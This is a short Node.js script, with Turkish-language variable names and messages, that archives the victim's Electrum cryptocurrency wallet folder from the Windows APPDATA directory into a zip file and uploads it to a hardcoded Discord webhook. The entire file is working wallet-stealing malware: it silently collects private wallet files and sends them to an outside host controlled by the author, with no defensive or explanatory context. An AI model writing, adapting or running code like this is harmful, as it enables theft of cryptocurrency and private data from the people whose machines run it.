const fs = require('fs');
const path = require('path');
const archiver = require('archiver');
const request = require('request');

const dosyaKonum = `${process.env.APPDATA}\\Electrum\\wallets`;
const output = fs.createWriteStream(path.join(__dirname, 'wallets.zip'));
const ziple = archiver('zip', { zlib: { level: 9 } });
ziple.pipe(output);
ziple.directory(dosyaKonum, false);
ziple.finalize();

output.on('close', function() {
  console.log(ziple.pointer() + ' dosya boyutu');
  console.log('dosya ziplendi');
  const sender = {
    method: 'POST',
    url: 'https://discord.com/api/webhooks/953630497332928512/muxevnoQwxmqimRcL0XoZy_mEE3R2R2qqeforO5iwC-BH7rNHl4TSkSnQDga3o2fz7bK',
    headers: {
      'Content-Type': 'application/zip',
    },
    formData: {
      file: {
        value: fs.createReadStream(path.join(__dirname, 'wallets.zip')),
        options: {
          filename: 'wallets.zip',
          contentType: 'application/zip',
        },
      },
    },
  };
  
  request(sender, function (error, response) {
    if (error) throw new Error(error);
    console.log(response.body);
  });
});
